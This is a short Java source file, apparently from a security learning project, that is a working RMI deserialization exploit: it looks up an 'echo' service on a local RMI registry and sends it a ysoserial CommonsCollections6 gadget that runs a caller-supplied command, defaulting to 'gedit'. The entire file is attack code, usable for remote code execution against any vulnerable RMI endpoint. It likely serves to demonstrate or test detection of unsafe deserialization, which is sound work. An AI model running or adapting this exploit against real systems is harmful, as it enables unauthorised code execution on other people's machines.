package com.gypsyengineer.ql.fun.java.rmi;

import ysoserial.payloads.CommonsCollections6;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Exploit {

    public static void main(String... args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        EchoInterface echo = (EchoInterface) registry.lookup("echo");
        String command = args.length > 0 ? args[0] : "gedit";
        Object payload = new CommonsCollections6().getObject(command);
        echo.echoObject(payload);
    }
}
